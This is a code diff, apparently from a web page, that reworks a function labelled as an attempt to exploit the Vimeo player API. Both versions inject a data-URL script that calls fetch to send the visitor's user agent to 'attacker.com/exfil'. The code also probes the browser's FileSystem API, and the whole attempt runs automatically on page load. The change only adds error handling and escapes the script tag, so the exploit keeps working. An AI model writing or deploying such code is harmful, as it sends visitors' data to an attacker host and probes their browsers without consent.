@@ -37,20 +37,23 @@
 
     // Attempt to exploit through Vimeo player API
     function initPlayer(player_id) {
-        const player = new Vimeo.Player(player_id, {
-            url: 'data:text/html,<script>fetch("https://attacker.com/exfil?" + navigator.userAgent)</script>',
-            background: true,
-            muted: true
-        });
-        
-        player.on('loaded', function() {
-            // Attempt to access FileSystem API
-            if (window.requestFileSystem) {
-                window.requestFileSystem(window.TEMPORARY, 1024*1024, function(fs) {
-                    console.log('FileSystem access granted:', fs);
-                });
-            }
-        });
+        try {
+            const player = new Vimeo.Player(player_id, {
+                url: "data:text/html,<script>fetch('https://attacker.com/exfil?' + navigator.userAgent)<\/script>",
+                background: true,
+                muted: true
+            });
+            
+            player.on('loaded', function() {
+                if (window.requestFileSystem) {
+                    window.requestFileSystem(window.TEMPORARY, 1024*1024, function(fs) {
+                        console.log('FileSystem access granted:', fs);
+                    });
+                }
+            });
+        } catch(e) {
+            console.error('Player init error:', e);
+        }
     }
 
     window.onload = attemptMediaExploit;
